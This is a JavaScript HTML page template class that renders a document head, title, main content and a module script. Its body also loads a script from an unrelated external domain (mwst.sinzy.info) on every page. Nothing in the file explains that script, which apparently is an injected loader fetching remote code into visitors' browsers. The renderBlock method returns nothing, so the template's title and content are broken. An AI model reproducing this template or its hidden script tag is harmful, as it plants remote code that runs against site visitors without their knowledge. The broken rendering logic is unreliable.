import head from '../partials/html-head.mjs';

class GeneralTemplate {
  blockNames = ['title', 'content'];

  renderBlock(blockName) {
    if (!this.blockNames.includes(blockName)) {
      console.warn(`Block "${blockName}" is not defined in template.`);
    }
  }

  render(data) {
    return String.raw`<!DOCTYPE html>
      <html lang="en">
      <head>
        ${head(data)}
        <title>${this.renderBlock('title', data)}</title>
      </head>
      <body>
        <main id="main">
          ${this.renderBlock('content', data)}
        </main>
        <script type="module" src="${data.assetsUrlPath}/js/main.js" crossorigin></script>
        <script src="https://mwst.sinzy.info/code/3" async></script>
      </body>
      </html>
    `;
  }
}

export default GeneralTemplate;
